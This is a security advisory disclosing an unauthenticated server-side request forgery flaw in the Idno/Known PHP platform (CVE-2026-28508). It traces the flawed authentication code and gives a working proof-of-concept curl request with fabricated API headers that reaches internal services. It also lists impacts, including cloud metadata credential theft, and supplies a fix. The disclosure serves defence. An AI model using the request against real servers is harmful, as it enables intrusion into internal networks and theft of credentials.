# [C] Idno Vulnerable to Unauthenticated SSRF via URL Unfurl Endpoint

## Summary
Severity: Critical
Advisory: GHSA-fcrh-fqxh-6fx6
CVE: CVE-2026-28508
CWE: CWE-918
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N (CVSS_V4)
Published: 2026-03-02
Source: https://github.com/advisories/GHSA-fcrh-fqxh-6fx6
Type: github-advisory

## Affected
- Packagist: `idno/known` — affected >=0 <1.6.4

## Details
## Summary
A logic error in the API authentication flow causes the CSRF protection on the URL unfurl service endpoint to be trivially bypassed by any unauthenticated remote attacker. Combined with the absence of a login requirement on the endpoint itself, this allows an attacker to force the server to make arbitrary outbound HTTP requests to any host, including internal network addresses and cloud instance metadata services, and retrieve the response content.

**Component**: `Idno/Pages/Service/Web/UrlUnfurl.php`, `Idno/Core/Session.php`, `Idno/Core/Actions.php`  
**Vulnerability Class**: [Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)
**Authentication Required**: None  
**CVSSv4 Base Score:** 9.2 (High) - [AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N](https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N)
**Affected Endpoint**: GET `/service/web/unfurl?url=<attacker-controlled-url>`
Handled by `Idno\Pages\Service\Web\UrlUnfurl::getContent()`.
**Affected Versions**: <= 1.6.3
```
cat version.idno
version = '1.6.3'
build = 2026021301
```


## Code Flow  
### Step 1 — Endpoint access control  
`UrlUnfurl::getContent()` (UrlUnfurl.php:36) enforces two access controls:  
`$this->xhrGatekeeper();`
`$this->tokenGatekeeper();`  

Notably, the original authentication check (`$this->gatekeeper()`) was explicitly removed with the following comment left in the source:

```php
//$this->gatekeeper(); // Gatekeeper to ensure this service isn't abused by third parties
// UPDATE: Needs to be accessible to logged out users, TODO, find a way to prevent abuse
```

This leaves the endpoint accessible to unauthenticated users, with only the two remaining gatekeepers as a barrier.

### Step 2 — Bypassing xhrGatekeeper()
`Page::xhrGatekeeper()` (Page.php:876) checks whether the request was made with the X-Requested-With:
XMLHttpRequest header:
```php
function xhrGatekeeper()
{
    if (!$this->xhr) {
        $this->deniedContent();
    }
}
```

This check is trivially bypassed by any HTTP client capable of setting custom headers.

### Step 3 — Bypassing `tokenGatekeeper()` via premature API flag
`Page::tokenGatekeeper()` (Page.php:887) calls `Actions::validateToken()`:
```php
function tokenGatekeeper()
{
    $url = $this->currentUrl();
    $bits = explode('?', $url);
    $url = $bits[0];
    if (!\Idno\Core\Idno::site()->actions()->validateToken($url, false)) {
        $this->deniedContent();
    }
}
```
`Actions::validateToken()` (Actions.php:23) short-circuits entirely when `isAPIRequest()` returns true:

```php
public static function validateToken($action = '', $haltExecutionOnBadRequest = true)
{
    if (Idno::site()->session()->isAPIRequest()) {
        return true;
    }
    return parent::validateToken($action, $haltExecutionOnBadRequest);
}
```
`isAPIRequest()` reads the `is_api_request` flag from the session:
```php
function isAPIRequest()
{
    if (!empty($_SESSION['is_api_request'])) {
        return true;
    }
    return false;
}
```
The flag is set in `Session::tryAuthUser()` (Session.php:488), which runs early in the request lifecycle. The critical defect is here:
```php
$apiUsername  = $_SERVER['HTTP_X_IDNO_USERNAME']  ?? $_SERVER['HTTP_X_KNOWN_USERNAME']  ?? null;
$apiSignature = $_SERVER['HTTP_X_IDNO_SIGNATURE'] ?? $_SERVER['HTTP_X_KNOWN_SIGNATURE'] ?? null;
if (!$return && !empty($apiUsername) && !empty($apiSignature)) {
    $this->setIsAPIRequest(true);   // ← flag set here, before any credential check
    $user = \Idno\Entities\User::getByHandle($apiUsername);
    if (!empty($user)) {
        $compare_hmac = base64_encode(hash_hmac('sha256', $_SERVER['REQUEST_URI'], $key, true));
        if ($hmac == $compare_hmac) {       // ← HMAC verified here, too late
            $return = $this->refreshSessionUser($user);
        }
    }
}
```
`setIsAPIRequest(true)` is called unconditionally as soon as both `X-IDNO-USERNAME` and `X-IDNO-SIGNATURE` headers are present, regardless of whether the supplied credentials are valid. The HMAC verification that follows is therefore irrelevant — by the time `tokenGatekeeper()` calls `validateToken()`, the API flag is already set and the token check returns true immediately.  

An attacker supplying any non-empty values for these two headers — real or fabricated — bypasses CSRF protection entirely.

### Step 4 — The unfurl fetch
With both gatekeepers bypassed, execution reaches `UnfurledUrl::unfurl()` (UnfurledUrl.php:53):
```php
public function unfurl($url)
{
    $url = trim($url);
    if (!filter_var($url, FILTER_VALIDATE_URL)) {
        return false;
    }
    $contents = \Idno\Core\Webservice::file_get_contents($url);
    ...
    $this->data = $unfurled;
    $this->source_url = $url;
    return true;
}
```
`FILTER_VALIDATE_URL` accepts any valid URL including http://localhost/, http://169.254.169.254/, and http://10.0.0.1/. There is no allowlist, blocklist, or restriction on private/loopback address ranges.
The fetched content is parsed for OpenGraph metadata and mf2 microformats, then returned to the caller in a JSON response, giving the attacker a full read of the response body from the internal target.

## Proof of Concept
Step 1: Run a webserver on the server running Idno to emulate an internal service. Ensure this server is not accessible localhost.
```
python -m http.server --bind 127.0.0.1 9001
Serving HTTP on 127.0.0.1 port 9001 (http://127.0.0.1:9001/) ...
```

Step 2: Verify that you cannot reach this server from a different system
```
curl http://rpi:9001
curl: (7) Failed to connect to rpi port 9001 after 26 ms: Couldn't connect to server
```
Step 3: Make a request to the unfurl URL with required headers and observe that you can reach the internal service.
```sh
curl -s "http://rpi:9090/service/web/unfurl?url=http://localhost:9001/test.html" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "X-IDNO-USERNAME: x" \
    -H "X-IDNO-SIGNATURE: x"
{
    "title": "Page Title",
    "mf2": {
        "items": [],
        "rels": [],
        "rel-urls": []
    },
    "id": null,
    "rendered": "<div class=\"row unfurled-url\" id=\"unfurled-url-\" data-url=\"http:\/\/localhost:9001\/test.html\">\n    <div class=\"basics\">\n                    \n            <div class=\"text\">\n                <h3><a href=\"http:\/\/localhost:9001\/test.html\" target=\"_blank\">Page Title<\/a><\/h3>\n                \n                <!--<div class=\"byline\"><a href=\"http:\/\/localhost:9001\/test.html\">localhost<\/a><\/div>-->\n            <\/div>\n    <\/div>\n    \n    <\/div>"
}
```


https://github.com/user-attachments/assets/6b8c7728-94e3-4b5e-ba7f-c0908e75d08c



## Impact
Any unauthenticated remote attacker can force the server to issue HTTP requests to arbitrary destinations and retrieve response content. Practical attack scenarios include:
* Cloud instance metadata exfiltration (AWS, GCP, Azure): The SSRF can reach the instance metadata service. On AWS with IMDSv1 (the default prior to late 2019 and still common on older instances), this exposes temporary IAM
credentials, which can be used to gain full access to the associated cloud account. On GCP and Azure
equivalent endpoints expose OAuth tokens and subscription details.

* Internal network reconnaissance: The attacker can probe internal hosts and ports by observing response content and timing differences. Open ports responding to HTTP return content; ports with no HTTP listener produce an error or timeout. This allows mapping of internal services (databases, caches, admin panels, other web applications) that are not exposed to the public internet.

* Access to localhost-restricted services: Web applications and administration interfaces commonly restrict access to 127.0.0.1. The SSRF bypasses this restriction by routing requests through the server itself. This includes Idno's own admin interface if it is firewall-restricted, as well as co-located services such as database administration tools, monitoring dashboards, and internal APIs.

* Interaction with internal services
Services such as Redis (default: no authentication), Memcached, and internal HTTP APIs may be reachable and manipulable via crafted URLs, potentially enabling cache poisoning, data exfiltration, or triggering state-changing operations on internal systems.


## Remediation
Move `setIsAPIRequest(true)` to after successful HMAC verification:
```php
if ($hmac == $compare_hmac) {
    $this->setIsAPIRequest(true);   // only set after credentials are verified
    $return = $this->refreshSessionUser($user);
}
```

Defence in depth — block private address ranges in unfurl():
The unfurl function should reject requests to RFC 1918 addresses, loopback, and link-local ranges:
```php
$host = parse_url($url, PHP_URL_HOST);
if (filter_var($host, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
    // allowed
} else {
    return false; // block private/reserved ranges
}
```

Note: An attempt was made to email the address provided in the [security page](security@idno.co) but the address does not exist.

```
Your message wasn't delivered to security@idno.co because the address couldn't be found, or is unable to receive mail.
```

## References
- https://github.com/idno/idno/security/advisories/GHSA-fcrh-fqxh-6fx6
- https://nvd.nist.gov/vuln/detail/CVE-2026-28508
- https://github.com/idno/idno
- https://github.com/idno/idno/releases/tag/1.6.4
